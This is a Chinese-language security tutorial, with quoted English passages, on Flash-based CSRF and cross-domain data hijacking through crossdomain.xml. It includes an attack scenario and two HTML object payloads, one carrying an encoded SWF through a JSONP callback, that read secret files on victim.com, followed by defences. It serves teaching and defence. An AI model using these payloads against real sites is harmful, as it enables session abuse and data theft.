## 0x01 简单介绍
CSRF的全称是Cross-Site Request Forgery，跨站请求伪造，即第三方冒充当前用户身份发送请求。
Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，示例请参照[CSRF](../跨站请求伪造/CSRF.md)

## 0x02  flash的跨域策略
adobe为了限制flash加载任意页面，使用了一种跨域策略来进行限制。
所谓的flash跨域策略文件就是在站点根目录的crossdomain.xml，这个XML文件配置当前站点的资源允许来自哪些域的flash加载。当flash加载一个站点的资源时，如果目标不跟自己一个站点，flash就会自动去访问目标站点根目录下的crossdomain.xml文件，如果crossdomain.xml中的allow-access-from domain标签包含flash所在网站，那么flash就可以加载该内容。
一个crossdomain.xml文件可能是这样的：
``` xml
<?xml version="1.0"?>
<cross-domain-policy>
<allow-access-from domain="*.example.com" />
<allow-access-from domain="www.test.com" secure="true" />
</cross-domain-policy>
```
以上策略就是允许来自*.example.com、www.test.com 的flash加载资源。secure="true" 的意思是只允许通过安全链接来请求本域的数据。在站点不存在crossdomain.xml文件的情况，允许flash主动加载目标站点的其他XML文件作为跨域策略文件。比如，flash9中可以使用Security.loadPolicyFile加载目标站点的其他文件作为跨域策略文件。如果没有跨域策略文件许可，那么flash就不能加载该站点的内容。

## 0x03  如何绕过跨域限制
我们要进行CSRF，可能需要获取目标站点某些页面中的内容，这个时候就得想办法绕过flash的跨域策略。
* 最简单的情况是目标站点本身没有安全意识，允许任意flash加载内容那就没话说了（allow-access-from domain="*"）。
* 还有就是目标站点根目录没有crossdomain.xml，那就看看能否找到上传文件的地方传一个同样格式的文件上去，然后用Security.loadPolicyFile加载之。这里貌似flash有通过Content-Type来判断，所以要文本类型的才有效。
* 在目标站点没有crossdomain.xml 情况下，在目标站点上传一个swf（文件后缀不重要），在 evil站点以 object 标签加载，这样swf 发出的请求其实是目标站点的同域请求，可以读取返回的数据。

>  If a Flash file (bogus image file) is uploaded on victim.com and then embedded at attacker.com, the Flash file can execute JavaScript within the domain of attacker.com. However, if the Flash file sends requests, it will be allowed to read files within the domain of victim.com.

> A SWF’s origin is the domain from which it was retrieved from, similar to a Java applet (uses IP addresses instead of domain names though), therefore a malicious page could embed a SWF, which originates from the target’s domain that could make arbitrary requests to the target domain and read the responses (steal sensitive data, defeat CSRF protections, and other generally nasty actions).

Based on these facts we can create an attack scenario like this:
``` 
An attacker creates a malicious Flash (SWF) file
The attacker changes the file extension to JPG
The attacker uploads the file to victim.com
The attacker embeds the file on attacker.com using an <object> tag with type "application/x-shockwave-flash"
The victim visits attacker.com, loads the file as embedded with the <object> tag
The attacker can now send and receive arbitrary requests to victim.com using the victims session
The attacker sends a request to victim.com and extracts the CSRF token from the response
```
A payload could look like this:
``` html
<object style="height:1px;width:1px;" data="http://victim.com/user/2292/profilepicture.jpg" 
type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="c=read&u=http://victim.com/
secret_file.txt"></object>
```
假如目标站点也找不到上传文件的地方，如果存在 jsonp 接口，也是可以直接利用的，我们把编译好的swf 代码当作callback 的参数，如下
``` html
<object style="height:1px;width:1px;" data="http://viticm.com/user/get?type=jsonp&callback=
CWS%07%0E000x%9C%3D%8D1N%C3%40%10E%DF%AE%8D%BDI%08%29%D3%40%1D%A0%A2%05%09%11%89HiP%22%05D%8BF%8E%0BG%26%1B%D9%8E%
117%A0%A2%DC%82%8A%1Br%04X%3B%21S%8C%FE%CC%9B%F9%FF%AA%CB7Jq%AF%7F%ED%F2%2E%F8%01%3E%9E%18p%C9c%9Al
%8B%ACzG%F2%DC%BEM%EC%ABdkj%1E%AC%2C%9F%A5%28%B1%EB%89T%C2Jj%29%93%22%DBT7%24%9C%8FH%CBD6%29%A3%0Bx%29
%AC%AD%D8%92%FB%1F%5C%07C%AC%7C%80Q%A7Nc%F4b%E8%FA%98%20b%5F%26%1C%9F5%20h%F1%D1g%0F%14%C1%0A%5Ds%8D%8B0Q
%A8L%3C%9B6%D4L%BD%5F%A8w%7E%9D%5B%17%F3%2F%5B%DCm%7B%EF%CB%EF%E6%8D%3An%2D%FB%B3%C3%DD%2E%E3d1d%EC%C7%3F6
%CD0%09" type="application/x-shockwave-flash" allowscriptaccess="always" 
flashvars="c=alert&u=http://mywebsite.example.com/secret_file.txt"></object>
```

* 最后一种情况是有crossdomain.xml，而且配置得很好。这个时候就要稍微麻烦一点，那我们就去找它支持flash加载的站点是否可以上传文件，上传我们精心构造的flash就好了。后缀倒无所谓：如果是以object标签调用flash的话任意后缀就可以；以embed调用的话除了jpg、jpeg、gif等少数后缀不支持外其他都可以。也就是说在一个中间站点上传文件，evil 站点加载中间站点的swf，swf 去请求目标站点的内容，因为swf 与中间站点同域，而这个域在 crossdomain.xml 允许的范围内，故可以成功。

## 0x04  如何防御
* Web程序中可以通过请求的来源进行判断：通过正常页面过来的referer我们已知的，flash过来的请求referer为空或者是swf文件地址。另外，flash发送请求的时候也会在HTTP头中带上x-flash-version标识版本。  
* So if you allow file uploads or printing arbitrary user data in your service, you should always verify the contents as well as sending a Content-Disposition header where applicable. e.g  
`Content-Disposition: attachment; filename="image.jpg"`  
Isolating the domain of the uploaded files is also a good solution as long as the crossdomain.xml file of the main website does not include the isolated domain.  
* 站点根目录的crossdomain.xml文件要配置好，尽量精确到子域，缩小被攻击面。

## Reference
[the-lesser-known-pitfalls-of-allowing-file-uploads-on-your-website](https://labs.detectify.com/2014/05/20/the-lesser-known-pitfalls-of-allowing-file-uploads-on-your-website/)  
[Even uploading a JPG file can lead to Cross Domain Data Hijacking](https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/)  
[Content-Type Blues](http://d3adend.org/blog/?p=242)  
[CrossSiteContentHijacking](https://github.com/nccgroup/CrossSiteContentHijacking)  
